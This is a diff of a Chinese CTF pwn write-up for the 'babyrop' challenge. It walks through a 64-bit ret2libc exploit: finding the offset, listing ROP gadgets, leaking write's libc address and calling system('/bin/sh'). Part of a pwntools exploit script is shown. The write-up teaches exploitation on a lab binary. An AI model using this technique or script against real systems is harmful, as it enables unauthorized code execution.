@@ -1,15 +1,18 @@
 # babyrop
+
 - 作者：pn1fg
-- 参考：SVUCTF-2023
+- 参考：-
 - 难度：Baby/Trivial/Easy/Normal/Medium/Hard/Expert/Insane
 - 分类：Pwn
 - 镜像：[svuctf-winter-2023/babyrop](https://ghcr.io/svuctf/svuctf-winter-2023/babyrop)
 - 端口：70
 
 ## 题目描述
-本题考点 `ret2libc` 
+
+本题考点 `ret2libc`
 
 ## 题目解析
+
 - 源码：[babyrop.c](build/babyrop)
 - 考点：64位下的 ROP - ret2libc
 
@@ -18,15 +21,20 @@
 `动态链接` 是指在程序装载时通过 `动态链接器` 将程序所需的所有 `动态链接库(Dynamic linking library)` 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。
 
 不是很能理解的同学看[这里](https://www.freebuf.com/news/182894.html)（这篇文章详细的阐述了 `StackOverFlow-Ret2libc` 的原理以及利用思路）
+
 ### 查看文件信息
+
 查看文件类型（`file` 命令）：
+
 ```shell
 $ file babyrop
 babyrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1adc48d4177aba667c4f389c674628d870b8a762, for GNU/Linux 3.2.0, not stripped
 ```
+
 这是一个64位 ELF 文件（`ELF 64-bit LSB executable`），动态链接（`dynamically linked`），没有去除符号（`not stripped`）
 
 检查文件保护机制（`checksec`命令）：
+
 ```shell
 $ checksec babyrop 
     Arch:     amd64-64-little
@@ -35,8 +43,11 @@ $ checksec babyrop
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```
+
 ### 分析漏洞成因
+
 反编译 `vuln` 函数：
+
 ```c
 void sym.vuln(void)
 
@@ -57,9 +68,11 @@ void sym.vuln(void)
     return;
 }
 ```
+
 `read` 函数处存在溢出漏洞
 
 使用 gdb + pwndbg 调试，在 `0x401227` 处打断点，输入一串字符串，打印栈上的情况
+
 ```asm
 pwndbg> stack 30
 00:0000│ rsp 0x7fffffffe400 ◂— 'Do you know buffer overflow?\n'
@@ -93,10 +106,13 @@ pwndbg> stack 30
 1c:00e0│     0x7fffffffe4e0 ◂— 0x0
 1d:00e8│     0x7fffffffe4e8 —▸ 0x7fffffffe5c8 —▸ 0x7fffffffe933 ◂— 'XDG_RUNTIME_DIR=/run/user/1000'
 ```
+
 我们输入的 `buf` 距离 `rbp` 寄存器 `0x7fffffffe490 - 0x7fffffffe420 = 0x70` ，与反汇编时输出一致，当输入 `0x70` 个字符后，再输入8个字节，就可完全覆盖 `rbp` ，继续再输入8个字节即可覆盖返回地址
 
 ### 构造利用载荷
+
 列出所有函数：
+
 ```c
 [0x0040121f]> afl
 0x004010b0    1     46 entry0
@@ -119,19 +135,23 @@ pwndbg> stack 30
 0x004012a7    1     45 main
 0x00401000    3     27 sym._init
 ```
+
 没有发现 `system`、`execve` 等函数
 
 查找一下敏感字符串
+
 ```shell
 $ ROPgadget --binary babyrop --string "/bin/sh"
 Strings information
 ============================================================
 ```
+
 分析到这可以判断本题使用的攻击方式是 `ret2libc` ，并且本题的输出函数只有一个 `write` 函数，我们来看一下 `write` 函数的原型
 
 ```shell
 ssize_t write(int fd, void *buf, size_t count);
 ```
+
 - `fd`：文件描述符，`1` 为标准输出
 - `buf`：读入位置
 - `count`：写入的字节数
@@ -139,6 +159,7 @@ ssize_t write(int fd, void *buf, size_t count);
 64 位 ELF 文件，所以需要寄存器传参，这里一共需要三个
 
 获取 ROP：
+
 ```shell
 $ ROPgadget --binary babyrop --only 'pop|ret'
 Gadgets information
@@ -156,7 +177,9 @@ Gadgets information
 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 0x000000000040101a : ret
 ```
+
 这里我们泄露 write 的地址，基本利用思路如下
+
 - 泄露 write 地址
 - 获取 libc 版本
 - 获取 system 地址与 /bin/sh 的地址
@@ -164,7 +187,9 @@ Gadgets information
 - 触发栈溢出执行 system(‘/bin/sh’)
 
 ### 编写利用程序
+
 [exp.py](writeup/exp.py)
+
 ```python
 from pwn import *
 from LibcSearcher import *
@@ -226,4 +251,5 @@ payload = flat(
 io.sendlineafter(b'flow?\n',payload)
 io.interactive()
 ```
+
 第一次泄漏的 `payload` 稍微有点复杂，大家注意栈上参数布置
